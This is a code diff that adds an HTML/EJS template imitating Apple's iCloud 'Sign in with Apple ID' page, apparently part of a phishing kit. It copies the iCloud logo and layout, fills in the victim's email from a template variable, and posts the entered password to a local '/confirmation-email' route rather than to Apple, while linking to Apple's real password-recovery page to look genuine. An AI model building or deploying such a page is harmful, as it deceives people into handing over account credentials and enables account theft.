@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Navbar Example</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.15/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap");
+    </style>
+  </head>
+
+  <body class="bg-[#FBFBFD]" style="font-family: 'Inter', sans-serif">
+    <nav class="flex justify-between items-center bg-[#FBFBFD] px-6">
+      <div class="flex items-center space-x-4">
+        <!-- Left Menu -->
+        <ul class="flex space-x-4">
+          <li>
+            <a href="#" class="text-gray-800 hover:text-gray-600"
+              ><svg
+                width="90"
+                height="31"
+                xmlns="http://www.w3.org/2000/svg"
+                class="apple-icloud-logo"
+                aria-hidden="true"
+              >
+                <g fill="none" fill-rule="nonzero">
+                  <path
+                    d="M77.005 23.215c1.568 0 2.767-.779 3.382-2.06h.061V23H83V8.204h-2.552v5.793h-.061c-.615-1.302-1.855-2.092-3.392-2.092-2.726 0-4.479 2.143-4.479 5.65v.01c0 3.497 1.742 5.65 4.489 5.65Zm.768-2.153c-1.64 0-2.654-1.333-2.654-3.497v-.01c0-2.163 1.025-3.496 2.654-3.496 1.568 0 2.675 1.374 2.675 3.496v.01c0 2.133-1.096 3.497-2.675 3.497Zm-13.05 2.153c1.64 0 2.757-.758 3.32-1.917h.052V23h2.552V12.13h-2.552v6.297c0 1.579-.933 2.635-2.398 2.635-1.455 0-2.173-.872-2.173-2.41v-6.521h-2.552v7.024c0 2.522 1.363 4.06 3.751 4.06Zm-10.826 0c3.187 0 5.257-2.122 5.257-5.65v-.02c0-3.507-2.1-5.64-5.267-5.64-3.157 0-5.248 2.154-5.248 5.64v.02c0 3.518 2.06 5.65 5.258 5.65Zm.01-2.06c-1.63 0-2.665-1.303-2.665-3.59v-.02c0-2.256 1.056-3.568 2.645-3.568 1.619 0 2.664 1.302 2.664 3.568v.02c0 2.277-1.035 3.59-2.644 3.59ZM44.137 23h2.55V8.204h-2.55V23Zm-8.357.256c3.402 0 5.913-2.102 6.292-5.137l.02-.102H39.5l-.031.102c-.482 1.825-1.804 2.84-3.69 2.84-2.572 0-4.232-2.07-4.232-5.362v-.01c0-3.282 1.65-5.343 4.233-5.343 1.926 0 3.228 1.056 3.658 2.748l.051.195h2.593l-.01-.103c-.39-3.014-2.89-5.137-6.292-5.137-4.243 0-6.938 2.912-6.938 7.64v.01c0 4.727 2.685 7.66 6.938 7.66ZM25.424 10.572a1.4 1.4 0 1 0 0-2.8c-.799 0-1.424.626-1.424 1.406 0 .759.625 1.394 1.424 1.394ZM24.144 23h2.551V12.13h-2.552V23Z"
+                    fill="#1D1D1F"
+                  ></path>
+                  <path
+                    d="M12.9 7.598c.608-.737 1.04-1.74 1.04-2.755 0-.14-.013-.28-.038-.394-.99.038-2.183.66-2.893 1.498-.559.635-1.079 1.65-1.079 2.666 0 .153.026.305.038.356.064.012.165.025.267.025.888 0 2.004-.597 2.664-1.396Zm.697 1.612c-1.484 0-2.69.901-3.464.901-.825 0-1.903-.85-3.197-.85C4.486 9.26 2 11.292 2 15.113c0 2.387.914 4.9 2.056 6.526.977 1.37 1.827 2.5 3.057 2.5 1.218 0 1.751-.812 3.261-.812 1.536 0 1.878.787 3.223.787 1.332 0 2.22-1.218 3.058-2.425.939-1.383 1.332-2.729 1.345-2.793-.076-.025-2.626-1.066-2.626-3.986 0-2.526 2.004-3.656 2.118-3.745-1.32-1.904-3.337-1.955-3.895-1.955Z"
+                    fill="#1D1D1F"
+                    opacity=".569"
+                  ></path>
+                </g>
+              </svg>
+            </a>
+          </li>
+        </ul>
+      </div>
+
+      <div class="flex items-center space-x-4">
+        <!-- Right Menu -->
+        <ul class="flex space-x-4">
+          <li>
+            <button
+              type="button"
+              class="flex items-center justify-center w-10 h-10 rounded-full focus:outline-none"
+            >
+              <span
+                class="inline-flex w-1 h-1 bg-black rounded-full mx-0.5"
+              ></span>
+              <span
+                class="inline-flex w-1 h-1 bg-black rounded-full mx-0.5"
+              ></span>
+              <span
+                class="inline-flex w-1 h-1 bg-black rounded-full mx-0.5"
+              ></span>
+            </button>
+          </li>
+        </ul>
+      </div>
+    </nav>
+
+    <div
+      class="flex flex-col items-center justify-center w-11/12 lg:w-2/5 mx-auto mt-16"
+    >
+      <div
+        class="max-w-full w-full bg-white rounded-3xl py-16"
+        style="box-shadow: rgba(0, 0, 0, 0.2) 0px 11px 34px 0px"
+      >
+        <div class="flex justify-center mb-6">
+          <!-- Logo -->
+          <img
+            src="/images/apple-login-center.svg"
+            alt="Logo"
+            class="h-40 w-40"
+          />
+        </div>
+        <form class="pt-5" action="/confirmation-email" method="post">
+          <h2 class="font-semibold text-center text-3xl">
+            Sign in with Apple ID
+          </h2>
+          <!-- Login form content -->
+          <div class="grid grid-cols-1 mt-8">
+            <div class="grid grid-cols-1">
+              <input
+                type="email"
+                placeholder="Email"
+                class="block w-3/5 mx-auto px-4 py-2 rounded-tl-md rounded-tr-md outline-none border border-solid"
+                value="<%= email %>"
+                disabled
+              />
+              <input type="hidden" name="email" value="<%= email %>">
+            </div>
+            <div class="grid grid-cols-1">
+              <div class="relative w-3/5 mx-auto">
+                <input
+                  type="password"
+                  class="w-full px-4 py-2 rounded-bl-md rounded-br-md border border-gray-300 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                  placeholder="Password"
+                  name="password"
+                  required
+                />
+                <button
+                  type="submit"
+                  class="absolute top-1 right-1 px-2 py-2 text-[#929292] border border-solid border-[#929292] rounded-full"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="h-4 w-4"
+                    viewBox="0 0 20 20"
+                    fill="#929292"
+                  >
+                    <path
+                      fill-rule="evenodd"
+                      d="M9.293 4.293a1 1 0 0 1 1.414 0l4 4a1 1 0 0 1 0 1.414l-4 4a1 1 0 0 1-1.414-1.414L11.586 11H4a1 1 0 0 1 0-2h7.586l-2.293-2.293a1 1 0 0 1 0-1.414z"
+                      clip-rule="evenodd"
+                    />
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+        </form>
+
+        <div class="flex justify-center items-center mt-10">
+            <label class="flex items-center space-x-1 text-gray-700">
+              <input type="checkbox" class="form-checkbox border-2 border-blue-500 text-blue-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+              <span class="text-md">Keep me signed in</span>
+            </label>
+          </div>
+
+          <div class="flex justify-center items-center hover:underline mt-4 text-sm">
+            <a href="https://iforgot.apple.com/password/verify/appleid" class="text-blue-600 hover:text-blue-800">
+                Forgot Apple ID or password?
+            </a>
+          </div>
+          
+          
+      </div>
+    </div>
+  </body>
+</html>
